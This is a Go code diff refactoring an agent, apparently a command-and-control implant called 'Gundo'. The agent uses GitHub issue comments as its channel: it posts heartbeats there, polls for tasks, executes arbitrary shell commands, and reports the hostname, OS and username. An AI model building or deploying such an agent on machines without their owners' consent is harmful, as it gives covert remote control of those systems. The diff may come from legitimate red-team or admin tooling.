@@ -1,4 +1,4 @@
-package main
+package agent
 
 import (
 	"fmt"
@@ -9,14 +9,13 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"gundo/shared"
 )
 
-// fixed client version rep
-const clientVersion = "0.1.0"
+const clientVersion = shared.Version
 
-// in memory state that payload/process is running.
-// It gives us a place to handle client specific behavior
-
+// agent memory state for records
 type Client struct {
 	ID        string
 	Version   string
@@ -26,9 +25,7 @@ type Client struct {
 	// Processed map[string]struct{}
 }
 
-// function to create a new client struct in memory and returns its address.
-// that way we can actually modify the values in memory rather than a copy
-func newClient(clientID string) *Client {
+func NewClient(clientID string) *Client {
 	return &Client{
 		ID:        clientID,
 		Version:   clientVersion,
@@ -36,11 +33,8 @@ func newClient(clientID string) *Client {
 	}
 }
 
-// ── Command execution ──────────────────────────────────────────────────────────
-
-// execute runs a shell command and returns its combined stdout+stderr.
-// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
-// og from ki
+// execute runs shell commands and returns stdout/stderr.
+// Uses the platform's native shell so user has freedom. Pipes, redirects, envs, etc. all work.
 
 func execute(cmd string) string {
 	trimmed := strings.TrimSpace(cmd)
@@ -109,21 +103,10 @@ func handleCd(cmd string) string {
 	return newDir
 }
 
-/*
-
-Client Behaviour:
-
-1. GundoMessage Task recieved
-2. client handles/executes task (client.handleTask(gundotask))
-3. inspects the task action (ping, echo, stauts, etc.)
-4. return the result as a GundoMessage onto repo
-*/
-
-func (c *Client) handleTask(task GundoMessage) GundoMessage {
-
+func (c *Client) handleTask(task shared.GundoMessage) shared.GundoMessage {
 	// Every result needs these common fields.
 	// take task from param --> drop it in to start building result return struct --> populate struct with output and return it
-	result := GundoMessage{
+	result := shared.GundoMessage{
 		Type:      "result",
 		TaskID:    task.TaskID,
 		ClientID:  c.ID,
@@ -144,7 +127,6 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 			result.Output = err.Error()
 			break
 		}
-
 		result.Output = hostname
 
 	case "get_os":
@@ -157,7 +139,6 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 			result.Output = err.Error()
 			break
 		}
-
 		result.Output = currentUser.Username
 
 	case "shutdown":
@@ -182,15 +163,11 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 		result.Status = "error"
 		result.Output = "unsupported action"
 	}
-
 	return result
 }
 
-// heartbeat to check health of client
-
-func (c *Client) createHeartbeat() GundoMessage {
-	// new gundo mesaget ype of heartbeat
-	return GundoMessage{
+func (c *Client) createHeartbeat() shared.GundoMessage {
+	return shared.GundoMessage{
 		Type:      "heartbeat",
 		ClientID:  c.ID,
 		Status:    "online",
@@ -198,60 +175,54 @@ func (c *Client) createHeartbeat() GundoMessage {
 	}
 }
 
-func (c *Client) heartbeatLoop(issueNumber int) {
-
-	// Send one immediately when the client starts.
+func (c *Client) HeartbeatLoop(issueNumber int) {
+	// Sent when the client starts
 	heartbeat := c.createHeartbeat()
 
-	if err := createComment(issueNumber, heartbeat); err != nil {
+	if err := shared.CreateComment(issueNumber, heartbeat); err != nil {
 		fmt.Printf("Heartbeat failed: %v\n", err)
 	} else {
 		fmt.Println("[+] Heartbeat sent")
 	}
 
-	// ticker to track the time on the heartbeat
-
+	// ticker to determine the heartbeat timing
 	ticker := time.NewTicker(2 * time.Minute)
 	defer ticker.Stop()
 
-	// happens based on range of the ticker to create a new heatbeat message
 	for range ticker.C {
 		heartbeat := c.createHeartbeat()
 
-		// if the heartbeat comment cant be made then the system is gone
-		if err := createComment(issueNumber, heartbeat); err != nil {
-			fmt.Printf("Heartbeat failed: %v\n", err)
+		if err := shared.CreateComment(issueNumber, heartbeat); err != nil {
+			fmt.Printf("Heartbeat failed, agent may be down: %v\n", err)
 			continue
 		}
-
 		fmt.Println("[+] Heartbeat sent")
 	}
 }
 
-func (c *Client) pollTasks(issueNumber int) {
+func (c *Client) PollTasks(issueNumber int) {
 
-	// Get the comments that already exist when the client starts.
-	comments, err := listComments(issueNumber)
+	comments, err := shared.ListComments(issueNumber)
 	if err != nil {
 		fmt.Printf("Error getting initial comments: %v\n", err)
 		return
 	}
 
 	// Keep the existing startup behavior: bookmark history without executing it.
-	var checkpoint commentCheckpoint
-	if _, err := checkpoint.accept(comments); err != nil {
+	var checkpoint shared.CommentCheckpoint
+	if _, err := checkpoint.Accept(comments); err != nil {
 		fmt.Printf("Error establishing comment bookmark: %v\n", err)
 		return
 	}
 
-	fmt.Printf("[+] Client %s listening for tasks...\n", c.ID)
+	fmt.Printf("[+] Agent %s listening for tasks...\n", c.ID)
 
 	for {
-		if err := c.pollTasksOnce(
+		if err := c.PollTasksOnce(
 			issueNumber,
 			&checkpoint,
-			listCommentsSince,
-			createComment,
+			shared.ListCommentsSince,
+			shared.CreateComment,
 		); err != nil {
 			fmt.Printf("Error polling comments: %v\n", err)
 		}
@@ -262,9 +233,9 @@ func (c *Client) pollTasks(issueNumber int) {
 // One iteration is separate from the timer so mocked tests can exercise the
 // actual task filtering and result posting without starting an endless loop.
 // replaced the huge loop inside of pollTasks
-func (c *Client) pollTasksOnce(issueNumber int, checkpoint *commentCheckpoint,
-	list func(int, time.Time) ([]IssueComment, error), post func(int, GundoMessage) error) error {
-	comments, err := checkpoint.poll(issueNumber, list)
+func (c *Client) PollTasksOnce(issueNumber int, checkpoint *shared.CommentCheckpoint,
+	list func(int, time.Time) ([]shared.IssueComment, error), post func(int, shared.GundoMessage) error) error {
+	comments, err := checkpoint.Poll(issueNumber, list)
 	if err != nil {
 		return err
 	}
@@ -272,7 +243,7 @@ func (c *Client) pollTasksOnce(issueNumber int, checkpoint *commentCheckpoint,
 	for _, comment := range comments {
 
 		// Convert the GitHub comment body into a Gundo message.
-		message, err := parseGundoMessage(comment.Body)
+		message, err := shared.ParseGundoMessage(comment.Body)
 		if err != nil {
 			fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
 			continue
